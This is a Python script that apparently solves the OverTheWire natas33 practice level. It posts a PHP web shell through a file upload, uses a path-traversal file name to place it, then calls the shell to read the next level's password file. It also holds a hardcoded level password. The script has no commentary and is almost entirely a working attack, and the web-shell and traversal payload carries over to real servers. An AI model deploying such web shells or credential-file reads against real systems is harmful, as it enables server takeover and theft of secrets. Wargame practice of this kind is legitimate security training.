import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string
from urllib import parse
import base64
import urllib
import re


    
natasURL = 'http://natas33.natas.labs.overthewire.org/'
natas_usr   = 'natas33'
natas_pword = 'shoogeiGa2yee3de6Aex8uaXeech5eey'

r = requests.Session()


files = [('uploadedfile', ('some.php', b'<?php echo shell_exec($_GET[\'c\']); ?>'))]
datas = {'submit':'Upload File', 'filename':"../../var/www/natas/natas33-new/zaa.php", 'MAX_FILE_SIZE':'4096'}
resp = r.post(natasURL, auth=(natas_usr, natas_pword), data=datas, files=files)
#print(resp.text)

response2 = r.get("http://natas33-new.natas.labs.overthewire.org/zaa.php?c=cat%20../../../../../../../etc/natas_webpass/natas34",
                  auth=(natas_usr, natas_pword))
print(resp.text)
print(resp.cookies)
print(resp.url)
print(resp.headers)




